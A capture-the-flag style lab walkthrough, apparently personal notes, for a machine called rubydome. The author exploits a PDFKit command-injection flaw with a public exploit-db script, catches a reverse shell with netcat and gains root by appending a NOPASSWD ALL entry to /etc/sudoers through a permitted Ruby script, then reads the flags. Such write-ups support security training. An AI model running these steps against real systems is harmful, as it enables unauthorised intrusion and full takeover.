`Running all scans on 192.168.217.22`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`3000/tcp open  ppp`

If we check port 3000
![[Pasted image 20240222184419.png]]

Just try to convert the localhost http://127.0.0.1

We get an error but it tells us the app name - PDFKit.
![[Pasted image 20240222184518.png]]

Search Google
![[Pasted image 20240222184547.png]]

https://www.exploit-db.com/exploits/51293

Download the script. It needs URL and parameter so let's check burp when we click the Convert button.

![[Pasted image 20240222184630.png]]

Retry the exploit
`└─$ python 51293.py -s 192.168.45.222 80 -w http://192.168.217.22:3000/pdf -p url`

Catch and upgrade
`└─$ nc -nlvp 80`  
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:80`
`Ncat: Listening on 0.0.0.0:80`
`Ncat: Connection from 192.168.217.22:46678.`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Sudo -l tells us we can run a ruby script in the user's home directory
`andrew@rubydome:~/app$ sudo -l`
`sudo -l`
`Matching Defaults entries for andrew on rubydome:`
    `env_reset, mail_badpass,`
    `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,`
    `use_pty`

`User andrew may run the following commands on rubydome:`
    `(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb`

Make a ruby script that adds andrew ALL=(ALL) NOPASSWD: ALL to the sudoers file
```
# Ruby script to append a line to the sudoers file

# Define the line to be added
new_line = "andrew ALL=(ALL) NOPASSWD: ALL"

# Specify the path to the sudoers file
sudoers_file = "/etc/sudoers"

# Check if the current user is root before proceeding
if Process.uid != 0
  puts "You need root privileges to modify the sudoers file."
  exit 1
end

# Check if the sudoers file exists
unless File.exist?(sudoers_file)
  puts "Sudoers file not found: #{sudoers_file}"
  exit 1
end

# Check if the line is already present in the sudoers file
if File.readlines(sudoers_file).grep(/#{Regexp.escape(new_line)}/).any?
  puts "Line already exists in sudoers file."
  exit 0
end

# Append the line to the sudoers file
begin
  File.open(sudoers_file, 'a') { |file| file.puts(new_line) }
  puts "Line added to sudoers file."
rescue => e
  puts "Error occurred while modifying sudoers file: #{e.message}"
end
```

Upload and run the file
`andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb`
`sudo /usr/bin/ruby /home/andrew/app/app.rb`
`Line added to sudoers file.`
`andrew@rubydome:~/app$ sudo -l`
`sudo -l`
`Matching Defaults entries for andrew on rubydome:`
    `env_reset, mail_badpass,`
    `secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,`
    `use_pty`

`User andrew may run the following commands on rubydome:`
    `(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb`
    `(ALL) NOPASSWD: ALL`

Switch to root and grab the flags

`andrew@rubydome:~/app$ sudo su -`
`sudo su -`
`root@rubydome:~# cd /root`
`cd /root`
`root@rubydome:~# cat proof.txt`
`cat proof.txt`
`65d9af44ba5205aedbdce02854101e75`
`root@rubydome:~# find / -name local.txt 2>/dev/null`
`find / -name local.txt 2>/dev/null`
`/home/andrew/local.txt`
`root@rubydome:~# cat /home/andrew/local.txt`
`cat /home/andrew/local.txt`
`876135f525423415e4d88ad433e54840`
